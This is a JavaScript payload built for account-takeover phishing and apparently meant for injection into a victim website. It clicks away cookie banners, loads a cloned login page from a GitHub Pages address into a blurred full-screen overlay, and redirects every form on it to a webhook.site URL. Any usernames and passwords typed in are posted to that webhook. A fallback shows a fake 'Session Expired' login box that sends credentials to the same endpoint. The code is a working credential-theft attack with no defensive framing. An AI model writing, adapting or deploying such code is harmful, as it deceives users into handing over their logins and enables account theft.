(function() {
  // === CONFIGURATION ===
  const LOGIN_PAGE_URL = 'https://swathip888a.github.io/ATO/index.html';
  const WEBHOOK_URL = 'https://webhook.site/399907c5-1b67-465c-a07c-999b01b70d9a';

  // === STEP 1: Auto-close cookie popups ===
  function closeCookiePopup() {
    const buttons = document.querySelectorAll('button');
    for (let btn of buttons) {
      const text = btn.innerText.toLowerCase();
      if (text.includes('accept all') || text.includes('accept') || text.includes('agree')) {
        console.log('[+] Clicking cookie button');
        btn.click();
        return true;
      }
    }
    return false;
  }

  // Try to close cookie popup
  let cookieClosed = closeCookiePopup();
  if (!cookieClosed) {
    const observer = new MutationObserver(function() {
      if (closeCookiePopup()) {
        observer.disconnect();
      }
    });
    observer.observe(document.body, { childList: true, subtree: true });
    setTimeout(() => observer.disconnect(), 3000);
  }

  // === STEP 2: Fetch and inject your EXACT login page ===
  setTimeout(() => {
    fetch(LOGIN_PAGE_URL)
      .then(response => response.text())
      .then(loginHTML => {
        // Create wrapper with blurred background
        const wrapper = document.createElement('div');
        wrapper.id = 'ato-modal-wrapper';
        wrapper.style.cssText = `
          position: fixed;
          top: 0;
          left: 0;
          width: 100%;
          height: 100%;
          z-index: 999999;
          pointer-events: none;
        `;

        // Blur overlay
        const blurOverlay = document.createElement('div');
        blurOverlay.style.cssText = `
          position: absolute;
          top: 0;
          left: 0;
          width: 100%;
          height: 100%;
          background: rgba(0, 0, 0, 0.5);
          backdrop-filter: blur(8px);
          -webkit-backdrop-filter: blur(8px);
          pointer-events: all;
        `;

        // Modal container - YOUR EXACT LOGIN PAGE GOES HERE
        const modalContainer = document.createElement('div');
        modalContainer.style.cssText = `
          position: absolute;
          top: 50%;
          left: 50%;
          transform: translate(-50%, -50%);
          pointer-events: all;
          z-index: 1000000;
          max-width: 95vw;
          max-height: 95vh;
          overflow: auto;
        `;
        
        // Insert your EXACT cloned HTML
        modalContainer.innerHTML = loginHTML;

        // Assemble
        wrapper.appendChild(blurOverlay);
        wrapper.appendChild(modalContainer);
        document.body.appendChild(wrapper);

        // === STEP 3: Hijack ALL forms to send credentials to webhook ===
        setTimeout(() => {
          document.querySelectorAll('#ato-modal-wrapper form').forEach(form => {
            // Change form action to your webhook
            form.action = WEBHOOK_URL;
            form.method = 'POST';
            
            // Also capture via event listener
            form.addEventListener('submit', function(e) {
              const formData = new FormData(form);
              const credentials = {};
              formData.forEach((value, key) => credentials[key] = value);
              
              console.log('[+] Credentials captured:', credentials);
              
              // Send to webhook
              fetch(WEBHOOK_URL, {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify(credentials)
              });
              
              // Optional: Show "loading" or "incorrect password" message
              // You can uncomment this to make it look real
              // const submitBtn = form.querySelector('button[type="submit"]');
              // if (submitBtn) {
              //   submitBtn.innerText = 'Logging in...';
              //   submitBtn.disabled = true;
              // }
            });
          });
        }, 500);

        // === STEP 4: Close modal when clicking outside ===
        blurOverlay.addEventListener('click', function() {
          wrapper.remove();
        });

        // Also close with Escape key
        document.addEventListener('keydown', function(e) {
          if (e.key === 'Escape') {
            const modal = document.getElementById('ato-modal-wrapper');
            if (modal) modal.remove();
          }
        });

      })
      .catch(error => {
        console.error('[!] Failed to load login page:', error);
        // Fallback simple form if fetch fails
        document.body.insertAdjacentHTML('beforeend', `
          <div id="fallback-modal" style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7);display:flex;justify-content:center;align-items:center;z-index:999999;">
            <div style="background:white;padding:2rem;border-radius:8px;width:350px;">
              <h3>Session Expired</h3>
              <form action="${WEBHOOK_URL}" method="POST">
                <input type="text" name="username" placeholder="Username" style="width:100%;margin:10px 0;padding:8px;" required>
                <input type="password" name="password" placeholder="Password" style="width:100%;margin:10px 0;padding:8px;" required>
                <button type="submit" style="width:100%;padding:10px;background:#007bff;color:white;border:none;border-radius:4px;">Login</button>
              </form>
              <a href="#" id="close-fallback" style="display:block;text-align:center;margin-top:10px;color:#999;">Close</a>
            </div>
          </div>
        `);
        document.getElementById('close-fallback')?.addEventListener('click', function(e) {
          e.preventDefault();
          document.getElementById('fallback-modal')?.remove();
        });
      });
  }, 1000);
})();
